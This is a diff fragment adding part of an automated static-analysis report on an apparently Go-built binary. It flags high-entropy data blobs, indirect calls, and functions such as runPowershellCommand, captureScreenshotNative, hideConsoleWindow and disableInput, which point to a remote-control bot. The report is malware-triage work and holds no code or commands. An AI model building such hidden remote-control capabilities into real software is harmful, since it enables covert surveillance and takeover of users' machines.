+    - github.com/tidwall/gjson.parseArray:0x682c62 call r12 [unresolved_indirect_call] evidence=target comes from register unknown
+    - github.com/tidwall/gjson.parseArray:0x682ea2 call r12 [unresolved_indirect_call] evidence=target comes from register unknown
+    - github.com/tidwall/gjson.parseArray:0x68373b call r12 [unresolved_indirect_call] evidence=target comes from register unknown
+    - github.com/tidwall/gjson.parseArray:0x683983 call r12 [unresolved_indirect_call] evidence=target comes from register unknown
+    - golang.org/x/crypto/pbkdf2.Key:0x68dfef call rdx [interface_method_or_object_dispatch] evidence=target comes from register RDX; target uses register-indirect memory addressing
+    - golang.org/x/crypto/pbkdf2.Key:0x68e10f call rcx [interface_method_or_object_dispatch] evidence=target comes from register RCX; target uses register-indirect memory addressing
+    - golang.org/x/crypto/pbkdf2.Key:0x68e13d call rdx [interface_method_or_object_dispatch] evidence=target comes from register RDX; target uses register-indirect memory addressing
+    - golang.org/x/crypto/pbkdf2.Key:0x68e188 call rdx [interface_method_or_object_dispatch] evidence=target comes from register RDX; target uses register-indirect memory addressing
+  suspicious_data_blobs:
+    - blob_0 .data:0xa1e000 size=0x1000 entropy=7.429 reasons=high_entropy refs=<none>
+    - blob_1 .data:0xa25000 size=0x3000 entropy=7.96 reasons=high_entropy refs=<none>
+    - blob_2 .data:0xa2a000 size=0x1000 entropy=6.547 reasons=contains_magic_bytes refs=<none>
+    - blob_3 .data:0xa38000 size=0x18000 entropy=8.0 reasons=contains_magic_bytes,high_entropy refs=<none>
+    - blob_4 .rdata:0x7bd000 size=0x1000 entropy=4.894 reasons=contains_magic_bytes refs=<none>
+    - blob_5 .rdata:0x8f0000 size=0x1000 entropy=5.719 reasons=contains_magic_bytes refs=<none>
+    - blob_6 .rdata:0x96e000 size=0x1000 entropy=4.71 reasons=contains_magic_bytes refs=<none>
+    - blob_7 .rdata:0x982000 size=0x1000 entropy=3.899 reasons=contains_magic_bytes refs=<none>
+    - blob_8 .rdata:0x9b0000 size=0x1000 entropy=3.924 reasons=contains_magic_bytes refs=<none>
+    - blob_9 .rdata:0x9bd000 size=0x1000 entropy=4.316 reasons=contains_magic_bytes refs=<none>
+  data_transformers:
+    - main.(*ProxyBot).SendRequest ops=add,shift,sub confidence=medium sources=<unknown>
+    - internal/filepathlite.volumeNameLen ops=add,shift,sub,xor confidence=medium sources=<unknown>
+    - internal/filepathlite.pathHasPrefixFold ops=add,xor confidence=medium sources=<unknown>
+    - internal/filepathlite.replaceStringByte ops=add,bytes_to_string,sub,xor confidence=medium sources=<unknown>
+    - internal/stringslite.Index ops=add,shift,sub,xor confidence=medium sources=<unknown>
+    - main.handleCommand ops=add,sub,xor confidence=medium sources=<unknown>
+    - main.executeCommand ops=add,bytes_to_string,sub,xor confidence=medium sources=<unknown>
+    - main.runPowershellCommand ops=add,bytes_to_string,sub,xor confidence=medium sources=<unknown>
+    - main.getGeoIP ops=add,bytes_to_string,shift,sub,xor confidence=medium sources=<unknown>
+    - main.doPrank ops=add,sub,xor confidence=medium sources=<unknown>
+  loader_behaviors:
+    - main.hideConsoleWindow kind=suspicious_runtime_behavior confidence=medium evidence=dynamic_syscall_call,executable_memory_requested
+    - main.captureScreenshotNative kind=suspicious_runtime_behavior confidence=medium evidence=dynamic_syscall_call,executable_memory_requested
+    - main.disableInput kind=suspicious_runtime_behavior confidence=medium evidence=dynamic_syscall_call
